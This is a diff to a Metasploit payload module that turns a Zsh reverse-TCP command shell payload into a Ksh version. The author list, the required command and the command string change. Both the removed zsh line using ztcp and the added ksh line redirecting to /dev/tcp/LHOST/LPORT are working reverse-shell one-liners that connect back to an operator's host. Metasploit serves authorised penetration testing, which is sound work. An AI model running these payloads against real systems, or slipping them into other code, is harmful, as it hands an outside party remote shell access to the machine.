@@ -9,30 +9,26 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 94
+  CachedSize = 52
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
+      'Name'        => 'Unix Command Shell, Reverse TCP (via Ksh)',
       'Description' => %q{
-        Connect back and create a command shell via Zsh.  Note: Although Zsh is often
+        Connect back and create a command shell via Ksh.  Note: Although Ksh is often
         available, please be aware it isn't usually installed by default.
       },
-      'Author'      =>
-        [
-          'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload
-          'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
-        ],
+      'Author'      => 'Wang Yihang <wangyihanger[at]gmail.com>',
       'License'     => MSF_LICENSE,
       'Platform'    => 'unix',
       'Arch'        => ARCH_CMD,
       'Handler'     => Msf::Handler::ReverseTcp,
       'Session'     => Msf::Sessions::CommandShell,
       'PayloadType' => 'cmd',
-      'RequiredCmd' => 'zsh',
+      'RequiredCmd' => 'ksh',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
   end
@@ -42,6 +38,6 @@ module MetasploitModule
   end
 
   def command_string
-    "zsh -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
   end
 end
